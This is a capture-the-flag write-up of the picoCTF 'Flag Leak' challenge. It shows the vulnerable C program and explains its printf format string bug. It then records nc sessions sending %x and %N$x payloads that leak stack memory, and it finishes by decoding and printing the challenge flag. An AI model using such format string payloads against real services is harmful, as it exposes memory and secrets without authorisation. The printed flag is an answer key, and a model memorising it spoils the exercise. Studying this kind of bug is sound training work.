# FLAG LEAK
In this challenge we are given 2 files: vuln and vuln.c  
Since vuln was an executable file, i tried to make sence from the c program given:
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```
The printf(story) statement is vulnerable to format string attacks.
Normally, printf expects a format string like %s. However, here the program directly uses the user input (story) as the format string. This allows the user to inject format specifiers like %x, %s, or %n.
Using this i can cause the flag to leak from the flag buffer.
So i started using format specifiers like %x and it gave me hex values as output:
```
aditya_cryptonite@DESKTOP-SG1LV2M:~$ nc saturn.picoctf.net 58267
Tell me a story and then I'll tell you one >> %x
Here's a story -
ff9d4bc0
```
This was just a memory address or a raw stack value, now i shall try to get more from the flag buffer:
```
aditya_cryptonite@DESKTOP-SG1LV2M:~$ nc saturn.picoctf.net 58267
Tell me a story and then I'll tell you one >> %x,%x,%x
Here's a story -
ff977ce0,ff977d00,8049346
```
Ok so this seems to be working, if i keep spamming %x like this i would likely encounter the hex values of the flag along the way:
```
aditya_cryptonite@DESKTOP-SG1LV2M:~$ nc saturn.picoctf.net 56413
Tell me a story and then I'll tell you one >> %x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
Here's a story -
fffd4520,fffd4540,8049346,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,252c78,6f636970,7b465443,6b34334c,5f676e31,67346c46,6666305f,3474535f,
```
Ok so i got a bunch of hex values by copy pasting %x again and again, intrestingly the hex values seems to stop at around the 42nd %x but i seemed to have entered more than that, anyways lets convert this hex to text:
![image](https://github.com/user-attachments/assets/959b8530-a3d2-41e2-b546-005501a4ef63)

So we can see that i do seem to have gotten the flag at the end which are these characters : ocip{FTCk43L_gn1g4lFff0_4tS_
The problem is the flag seems incomplete.
I was stuck so ig bruteforcing is the only way to get the remaining flag. To get the remaining part of the flag after the 42nd %x i started bruteforcing from the 43rd position.

Bruteforcing:
```
aditya_cryptonite@DESKTOP-SG1LV2M:~$ nc saturn.picoctf.net 60347
Tell me a story and then I'll tell you one >> %43$x
Here's a story -
315f6b63

aditya_cryptonite@DESKTOP-SG1LV2M:~$ nc saturn.picoctf.net 60347
Tell me a story and then I'll tell you one >> %44$x
Here's a story -
62326131

aditya_cryptonite@DESKTOP-SG1LV2M:~$ nc saturn.picoctf.net 60347
Tell me a story and then I'll tell you one >> %45$x
Here's a story -
7d613235

aditya_cryptonite@DESKTOP-SG1LV2M:~$ nc saturn.picoctf.net 60347
Tell me a story and then I'll tell you one >> %46$x
Here's a story -
fbad2000
```
Now we got the hex values for the remaining flag. Now to add these to the previous flag parts and converting to text:

![image](https://github.com/user-attachments/assets/6aa3c43a-bd71-460b-8442-e29b5bd19c70)

So now i seem to have the entire flag : ocip{FTCk43L_gn1g4lFff0_4tS_1_kcb2a1}a25

I just need to arrange it to make sence. If we see really carefully we can see that some sort of reversing is occuring here(at every 4 places it seems), ocip becomes pico, {FTC is CTF{, lets continue the pattern and see where it gets us:

picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a} 

yay i got it( the reversing thing hurt my brain tho)

### Flag:
>picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a} 
